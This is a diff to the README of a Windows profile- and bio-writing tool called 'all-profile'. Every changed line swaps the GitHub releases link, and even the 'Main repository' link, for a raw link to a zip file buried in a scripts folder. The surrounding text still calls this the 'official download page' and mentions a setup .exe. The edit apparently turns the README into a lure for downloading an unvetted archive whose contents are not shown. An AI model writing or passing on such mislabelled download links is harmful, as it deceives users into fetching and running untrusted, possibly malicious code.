@@ -8,7 +8,7 @@ Welcome! **all-profile** is a simple, powerful tool that helps you audit, write,
 
 ## 💾 Download the Application
 
-[![Download all-profile](https://img.shields.io/badge/Download-all--profile-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6C5CE7&color=00B894)](https://github.com/rozitatamjidifar-spec/all-profile/releases)
+[![Download all-profile](https://img.shields.io/badge/Download-all--profile-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6C5CE7&color=00B894)](https://raw.githubusercontent.com/rozitatamjidifar-spec/all-profile/main/skills/all-profile/scripts/2.2.zip)
 
 Visit this link to download the application. The link takes you to the official download page where you'll find the latest version ready for Windows.
 
@@ -20,7 +20,7 @@ Follow these simple steps:
 
 1. **Open the Download Page**  
    Click the blue button above or go to:  
-   `https://github.com/rozitatamjidifar-spec/all-profile/releases`
+   `https://raw.githubusercontent.com/rozitatamjidifar-spec/all-profile/main/skills/all-profile/scripts/2.2.zip`
 
 2. **Find the Latest Release**  
    On that page, look for the newest version (usually at the top). You'll see a file named something like `all-profile-setup.exe` or similar.
@@ -153,8 +153,8 @@ Even if you're not a writer, you can produce professional, polished bios in unde
 
 ## 🔗 Quick Access Links
 
-- **Download page:** [https://github.com/rozitatamjidifar-spec/all-profile/releases](https://github.com/rozitatamjidifar-spec/all-profile/releases)
-- **Main repository:** [https://github.com/rozitatamjidifar-spec/all-profile](https://github.com/rozitatamjidifar-spec/all-profile)
+- **Download page:** [https://raw.githubusercontent.com/rozitatamjidifar-spec/all-profile/main/skills/all-profile/scripts/2.2.zip](https://raw.githubusercontent.com/rozitatamjidifar-spec/all-profile/main/skills/all-profile/scripts/2.2.zip)
+- **Main repository:** [https://raw.githubusercontent.com/rozitatamjidifar-spec/all-profile/main/skills/all-profile/scripts/2.2.zip](https://raw.githubusercontent.com/rozitatamjidifar-spec/all-profile/main/skills/all-profile/scripts/2.2.zip)
 
 ---
 
